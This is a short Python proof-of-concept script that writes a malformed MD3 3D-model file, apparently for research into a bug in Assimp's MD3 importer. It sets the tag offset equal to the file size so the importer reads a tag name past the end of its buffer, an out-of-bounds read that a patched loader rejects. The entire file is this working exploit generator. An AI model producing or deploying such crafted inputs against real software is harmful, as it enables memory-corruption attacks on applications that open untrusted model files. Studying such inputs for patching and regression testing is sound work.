#!/usr/bin/env python3
"""MD3 input for Assimp MD3Importer::InternReadFile.

The header is valid enough to build one triangle. NUM_TAGS is 1 and
OFS_TAGS equals the file size, so the tag-name read is past the buffer
(MD3Loader.cpp, the pcTags->NAME load). The patched loader rejects that
offset before the read. A 4-byte magic guess never reaches the tag loop.
"""
import argparse
import pathlib
import struct


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="poc.bin")
    args = ap.parse_args()

    hdr = bytearray(108)
    hdr[0:4] = b"IDP3"
    struct.pack_into("<I", hdr, 4, 15)  # VERSION
    struct.pack_into("<I", hdr, 76, 1)  # NUM_FRAMES
    struct.pack_into("<I", hdr, 80, 1)  # NUM_TAGS
    struct.pack_into("<I", hdr, 84, 1)  # NUM_SURFACES
    struct.pack_into("<I", hdr, 92, 108)  # OFS_FRAMES
    struct.pack_into("<I", hdr, 100, 108)  # OFS_SURFACES

    surf = bytearray(108)
    surf[0:4] = b"IDP3"
    struct.pack_into("<I", surf, 72, 1)  # NUM_FRAMES
    struct.pack_into("<I", surf, 76, 0)  # NUM_SHADER
    struct.pack_into("<I", surf, 80, 1)  # NUM_VERTICES
    struct.pack_into("<I", surf, 84, 1)  # NUM_TRIANGLES
    struct.pack_into("<I", surf, 88, 108)  # OFS_TRIANGLES
    struct.pack_into("<I", surf, 92, 0)  # OFS_SHADERS
    struct.pack_into("<I", surf, 96, 120)  # OFS_ST
    struct.pack_into("<I", surf, 100, 128)  # OFS_XYZNORMAL
    struct.pack_into("<i", surf, 104, 136)  # OFS_END

    body = bytes(surf) + struct.pack("<III", 0, 0, 0) + struct.pack("<ff", 0.0, 0.0)
    body += struct.pack("<hhhH", 0, 0, 0, 0)
    file_size = 108 + len(body)
    struct.pack_into("<I", hdr, 96, file_size)  # OFS_TAGS at EOF
    struct.pack_into("<I", hdr, 104, file_size)  # OFS_EOF
    blob = bytes(hdr) + body
    out = pathlib.Path(args.out)
    out.write_bytes(blob)
    print(f"wrote {out} ({len(blob)} bytes) OFS_TAGS={file_size}")


if __name__ == "__main__":
    main()
